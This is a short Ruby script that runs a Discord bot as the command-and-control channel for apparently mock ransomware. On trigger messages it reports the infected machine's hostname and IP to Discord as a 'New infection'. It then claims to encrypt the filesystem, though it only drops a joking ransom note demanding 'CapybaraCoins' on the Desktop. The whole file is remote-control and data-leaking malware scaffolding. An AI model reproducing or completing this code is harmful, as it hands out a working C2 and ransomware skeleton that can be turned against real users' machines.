#!/usr/bin/ruby
require 'discordrb'
require 'socket'

$bot_token = ''

$received_signal = 0
bot = Discordrb::Bot.new token: $bot_token

bot.message(with_text: "SEQ_START") do |event|
	puts "Received SEQ_START"
	$received_signal = 1
end

bot.message(with_text: "SET_KEY") do |event|
	if $received_signal == 1
		puts "Obtained key."
	end
end

bot.message(with_text: "LEAK_INFO") do |event|
	if $received_signal == 1
		puts "Leaking data..."
		my_ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
		my_hostname = Socket.gethostname
		event.respond "[*] New infection: #{my_hostname} (#{my_ip})."
	end
end

bot.message(with_text: "CRYPT_START") do |event|
	if $received_signal == 1
		puts "Encrypting filesystem..."
		begin
			desktop = ""
			if Dir.exist?(File.expand_path('~') + "/Desktop")
				desktop = "#{File.expand_path('~')}/Desktop"
			elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
				desktop = "#{File.expand_path('~')}/Escritorio"
			else
				desktop = "/tmp"
			end
			File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
			""
		rescue => e
			puts "Exception: #{e}"
			"Error: Failed to run supplied command."
		end
	end
end

bot.message(with_text: "SEQ_END") do |event|
	if $received_signal == 1
		puts "Received SEQ_END"
		$received_signal = 0
	end
end

bot.run